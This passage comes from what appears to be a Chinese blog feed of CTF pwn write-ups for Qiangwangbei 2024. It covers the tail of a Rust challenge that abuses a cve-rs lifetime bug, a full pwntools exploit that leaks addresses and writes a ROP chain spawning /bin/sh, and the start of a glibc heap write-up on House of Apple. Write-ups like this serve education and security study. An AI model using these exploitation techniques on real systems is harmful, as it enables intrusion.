invoke__">read_line</span>(&amp;<span class="keyword">mut</span> index).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">index</span>: <span class="type">usize</span> = index.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">prompt</span>(<span class="string">&quot;Content&quot;</span>.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">handle</span> = io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">lock</span>();</span><br><span class="line">        handle.<span class="title function_ invoke__">read</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>.msg_list[index].data).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read&quot;</span>);</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Content: &#123;&#125;&quot;</span>, <span class="keyword">self</span>.msg_list[index]);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">delete_msg</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">prompt</span>(<span class="string">&quot;Index&quot;</span>.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">index</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> index).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">index</span>: <span class="type">usize</span> = index.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line">        <span class="keyword">self</span>.msg_list.<span class="title function_ invoke__">remove</span>(index);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">get_ptr</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;static</span> <span class="keyword">mut</span> Msg &#123;</span><br><span class="line">        <span class="keyword">const</span> S: &amp;&amp;() = &amp;&amp;();</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">fn</span> <span class="title function_">get_ptr</span>&lt;<span class="symbol">&#x27;a</span>, <span class="symbol">&#x27;b</span>, T: ?<span class="built_in">Sized</span>&gt;(x: &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;b</span> <span class="keyword">mut</span> T &#123;</span><br><span class="line">            <span class="keyword">fn</span> <span class="title function_">ident</span>&lt;<span class="symbol">&#x27;a</span>, <span class="symbol">&#x27;b</span>, T: ?<span class="built_in">Sized</span>&gt;(_val_a: &amp;<span class="symbol">&#x27;a</span> &amp;<span class="symbol">&#x27;b</span> (), val_b: &amp;<span class="symbol">&#x27;b</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> T &#123;</span><br><span class="line">                val_b</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">f</span>: <span class="title function_ invoke__">fn</span>(_, &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;b</span> <span class="keyword">mut</span> T = ident;</span><br><span class="line">            <span class="title function_ invoke__">f</span>(S, x)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">msg</span> = Msg::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        <span class="title function_ invoke__">get_ptr</span>(&amp;<span class="keyword">mut</span> msg)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[inline(never)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">chat_box</span> = ChatBox::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;I am a chatting bot of QWB S8, you can chat with me.&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;If you delight me, I will give you flag!&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;This is function menu: &quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;1. add&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;2. show&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;3. edit&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;4. delete&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;5. exit&quot;</span>);</span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">prompt</span>(<span class="string">&quot;Choice&quot;</span>.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">choice</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> choice).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">choice</span>: <span class="type">i8</span> = choice.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">match</span> choice &#123;</span><br><span class="line">            <span class="number">1</span> =&gt; chat_box.<span class="title function_ invoke__">add_msg</span>(),</span><br><span class="line">            <span class="number">2</span> =&gt; chat_box.<span class="title function_ invoke__">show_msg</span>(),</span><br><span class="line">            <span class="number">3</span> =&gt; chat_box.<span class="title function_ invoke__">edit_msg</span>(),</span><br><span class="line">            <span class="number">4</span> =&gt; chat_box.<span class="title function_ invoke__">delete_msg</span>(),</span><br><span class="line">            <span class="number">5</span> =&gt; <span class="keyword">break</span>,</span><br><span class="line">            _ =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Invalid Choice!&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目漏洞点的核心在于这个poc函数，来自于<a href="https://github.com/Speykious/cve-rs">cve-rs</a>并在UIUCTF2024 Rusty Pointer中用过的：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">get_ptr</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;static</span> <span class="keyword">mut</span> Msg &#123;</span><br><span class="line">        <span class="keyword">const</span> S: &amp;&amp;() = &amp;&amp;();<span class="comment">// 定义一个常量 S，它是一个指向空元组的引用的引用</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 定义一个泛型函数 get_ptr，接受一个可变引用 x，并返回一个不同生命周期的可变引用</span></span><br><span class="line">        <span class="keyword">fn</span> <span class="title function_">get_ptr</span>&lt;<span class="symbol">&#x27;a</span>, <span class="symbol">&#x27;b</span>, T: ?<span class="built_in">Sized</span>&gt;(x: &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;b</span> <span class="keyword">mut</span> T &#123;</span><br><span class="line">            <span class="comment">// 定义一个辅助函数 ident，接受两个参数：一个引用的引用和一个可变引用</span></span><br><span class="line">            <span class="keyword">fn</span> <span class="title function_">ident</span>&lt;<span class="symbol">&#x27;a</span>, <span class="symbol">&#x27;b</span>, T: ?<span class="built_in">Sized</span>&gt;(_val_a: &amp;<span class="symbol">&#x27;a</span> &amp;<span class="symbol">&#x27;b</span> (), val_b: &amp;<span class="symbol">&#x27;b</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> T &#123;</span><br><span class="line">                val_b</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 定义一个函数指针 f，指向 ident 函数</span></span><br><span class="line">            <span class="keyword">let</span> <span class="variable">f</span>: <span class="title function_ invoke__">fn</span>(_, &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;b</span> <span class="keyword">mut</span> T = ident;</span><br><span class="line">            <span class="title function_ invoke__">f</span>(S, x)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">msg</span> = Msg::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        <span class="title function_ invoke__">get_ptr</span>(&amp;<span class="keyword">mut</span> msg)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这个函数的目的是“通过对变量静态生存周期的混淆，欺骗编译器不释放离开生存期的变量，从而获得一个离开生命周期后仍然可用的指针”，本题中vec里的那一个个栈上地址能够被使用就是因为这个函数。反正就是来回套娃，利用了一个骗过rust编译器生命周期的技巧来实现这一点。</p><p>原理这块先鸽了。</p><h2 id="exp：">exp：</h2><p>出题人</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">author: GeekCmore</span></span><br><span class="line"><span class="string">time: 2024-10-30 17:06:06</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">filename = <span class="string">&quot;/home/geekcmore/Desktop/qwb/chat_with_me/attachments/pwn&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/geekcmore/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/libc6_2.39-0ubuntu8.3_amd64/usr/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;localhost&quot;</span></span><br><span class="line">port = <span class="number">6666</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b *$rebase(0x1A979)</span></span><br><span class="line"><span class="string">b /home/geekcmore/RustroverProjects/chat-with-me/src/main.rs:145</span></span><br><span class="line"><span class="string">set debug-file-directory /home/geekcmore/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/libc6-dbg_2.39-0ubuntu8.3_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/geekcmore/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/glibc-source_2.39-0ubuntu8.3_all/usr/src/glibc/glibc-2.39</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript=gs)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line"> </span><br><span class="line">p = start()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Choice &gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Choice &gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index &gt; &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Choice &gt; &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index &gt; &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&quot;Content &gt; &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Choice &gt; &quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index &gt; &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Choice &gt; &quot;</span>, <span class="string">b&quot;5&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tidy</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content: &quot;</span>)</span><br><span class="line">    y = p.recvline()[<span class="number">1</span>:-<span class="number">2</span>].decode().replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">    values = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        tmp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            tmp += <span class="built_in">int</span>(y[i * <span class="number">8</span> + <span class="number">7</span> - j])</span><br><span class="line">            tmp &lt;&lt;= <span class="number">8</span></span><br><span class="line">        tmp &gt;&gt;= <span class="number">8</span></span><br><span class="line">        values.append(tmp)</span><br><span class="line">    info([<span class="built_in">hex</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> values])</span><br><span class="line">    <span class="keyword">return</span> values</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">addr_list = tidy()</span><br><span class="line">stack_addr = addr_list[<span class="number">4</span>]</span><br><span class="line">elf.address = addr_list[<span class="number">5</span>] - <span class="number">0x635B0</span></span><br><span class="line">heap_addr = addr_list[<span class="number">1</span>]</span><br><span class="line">success(<span class="string">f&quot;stack_addr -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(stack_addr)&#125;</span>&quot;</span>)</span><br><span class="line">success(<span class="string">f&quot;elf_addr -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(elf.address)&#125;</span>&quot;</span>)</span><br><span class="line">success(<span class="string">f&quot;heap_addr -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(heap_addr)&#125;</span>&quot;</span>)</span><br><span class="line">fake_heap = p64(<span class="number">1</span>) + p64(<span class="number">0x91</span>) + p64(<span class="number">1</span>) * <span class="number">2</span> + p64(heap_addr - <span class="number">0x2010</span>) + p64(<span class="number">0x1FE1</span>)</span><br><span class="line">edit(<span class="number">0</span>, fake_heap)</span><br><span class="line">tidy()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add()</span><br><span class="line">info(<span class="string">&quot;start&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arb_qword</span>(<span class="params">addr, qword</span>):</span><br><span class="line">    edit(<span class="number">1</span>, p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x51</span>) + p64(addr))</span><br><span class="line">    info(<span class="string">f&quot;Write <span class="subst">&#123;<span class="built_in">hex</span>(u64(qword))&#125;</span> to [<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>]&quot;</span>)</span><br><span class="line">    edit(<span class="number">0</span>, qword)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arb_write</span>(<span class="params">addr, content</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(content), <span class="number">8</span>):</span><br><span class="line">        arb_qword(addr + i, content[i : i + <span class="number">8</span>])</span><br><span class="line"> </span><br><span class="line">ret_addr = stack_addr + <span class="number">0x3D0</span></span><br><span class="line">syscall = elf.address + <span class="number">0x0000000000026FCF</span></span><br><span class="line">pop_rdi_rbp = elf.address + <span class="number">0x000000000001DD45</span></span><br><span class="line">pop_rsi_rbp = elf.address + <span class="number">0x000000000001E032</span></span><br><span class="line">pop_rax = elf.address + <span class="number">0x0000000000016F3E</span></span><br><span class="line">pop_rdx_xor_ptrax = elf.address + <span class="number">0x0000000000045DC5</span></span><br><span class="line">sub_rdx_rcx_add_rax_rcx = elf.address + <span class="number">0x000000000001FC60</span></span><br><span class="line">pop_rcx = elf.address + <span class="number">0x0000000000017FFF</span></span><br><span class="line">ret = elf.address + <span class="number">0x0000000000016BD8</span></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload += p64(pop_rdi_rbp) + p64(ret_addr + <span class="number">0x60</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_rbp) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rcx) + p64(<span class="number">0x33</span>)</span><br><span class="line">payload += p64(sub_rdx_rcx_add_rax_rcx)</span><br><span class="line">payload += p64(pop_rax) + p64(constants.SYS_execve)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">arb_write(ret_addr, payload)</span><br><span class="line">quit()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;题目分析&lt;/h1&gt;
&lt;p&gt;到手之后是一个扣了符号的rust程序，非常的恶心。&lt;/p&gt;
&lt;h1&gt;最后看看出题人的分享&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://bbs.kanxue.com/thread-284240.htm&quot;&gt;https:</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="逆向" scheme="http://example.com/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="heap" scheme="http://example.com/tags/heap/"/>
    
    <category term="rust" scheme="http://example.com/tags/rust/"/>
    
  </entry>
  
  <entry>
    <title>常见的加密算法逆向识别</title>
    <link href="http://example.com/2024/11/11/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E8%AF%86%E5%88%AB/"/>
    <id>http://example.com/2024/11/11/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E8%AF%86%E5%88%AB/</id>
    <published>2024-11-11T02:49:48.000Z</published>
    <updated>2024-11-11T02:49:48.628Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>How2Heap实战——强网杯2024babyheap</title>
    <link href="http://example.com/2024/11/10/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%BC%BA%E7%BD%91%E6%9D%AF2024babyheap/"/>
    <id>http://example.com/2024/11/10/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%BC%BA%E7%BD%91%E6%9D%AF2024babyheap/</id>
    <published>2024-11-10T15:55:14.000Z</published>
    <updated>2024-11-15T09:44:47.966Z</updated>
    
    <content type="html"><![CDATA[<h1>题目分析</h1><p>这个题目给了相当多的check：</p><ul class="lvl-0"><li class="lvl-2">沙箱ban了open，openat和execve，glibc 2.35, 释放有UAF, chunk只能分配0x500-0x5FF大小，其余大小都会变成0x500，最多5个，只有一次edit一次show。</li><li class="lvl-2">程序开始会把IO_wfile_jumps向后的page全写0</li><li class="lvl-2">同时允许一个经过check的地址写16字节，check不允许写stdin到stdin向后0x1b000，以及stdin-1C67F700往前（非libc段不让写）</li><li class="lvl-2">另外提供了一个接口，允许查询USER环境变量或者将其修改为“flag?&quot;，只能用一次。</li><li class="lvl-2">Largebin attack会用完5个块，同时也会用掉唯一一次UAF edit。后续没有办法再次控制chunk内容</li><li class="lvl-2">而且题目提供的任意地址写无法写glibc前面（也就是堆）地址，同时也没法直接写已经打开的IO（0-2和IOlistall都不行）</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">change_user_env</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( flag_only_once )</span><br><span class="line">  &#123;</span><br><span class="line">    my_print((__int64)<span class="string">&quot;What ! Are you kidding me ? \n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  flag_only_once = <span class="number">1</span>;</span><br><span class="line">  my_print((__int64)<span class="string">&quot;What do you want from the environment ? \n&quot;</span>);</span><br><span class="line">  my_print((__int64)<span class="string">&quot;Maybe you will be sad !\n&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    setenv(<span class="string">&quot;USER&quot;</span>, <span class="string">&quot;flag?&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      cur_user();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v1 != <span class="number">2</span> )</span><br><span class="line">LABEL_11:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      putenv(<span class="string">&quot;USER=flag?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">check_addr</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">stdin</span> &lt;= buf &amp;&amp; &amp;<span class="built_in">stdin</span>[<span class="number">512</span>] &gt; buf )      <span class="comment">// 不允许写012和iolistall</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  result = buf;</span><br><span class="line">  <span class="keyword">if</span> ( &amp;<span class="built_in">stdin</span>[<span class="number">-0x21AAA0</span>u] &gt; buf )               <span class="comment">// 不允许写heap和程序本身</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> result;                                <span class="comment">// 其他的libc都可以改...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种情况下我们该怎么攻击？下面介绍几种通过这个题其他队伍解出来的wp获得的思路，感觉下面这些再不通就没什么太多别的思路了。</p><h1>思路？</h1><h2 id="IO-wfile-jumps-mmap与House-of-apple">_IO_wfile_jumps_mmap与House of apple</h2><p>在house_of_apple v2中，劫持控制流依靠的是<code>IO_wfile_overflow</code>函数，利用了对这部分vtable没有检查的特性。但其实这个函数存在于三个虚表中，包括<code>IO_wfile_jumps</code>，<code>io_wfile_jumps_mmap</code>以及<code>io_wfile_jumps_maybe_mmap</code>。这道题其实没有控制<code>IO_wfile_jumps_maybe_mmap</code>，因此其实我们还是能用house of apple。</p><p>在pwndbg中确定<code>io_wfile_overflow</code>的地址后利用search pointer可以看到：</p><figure class="highlight bash"><table><tr><td 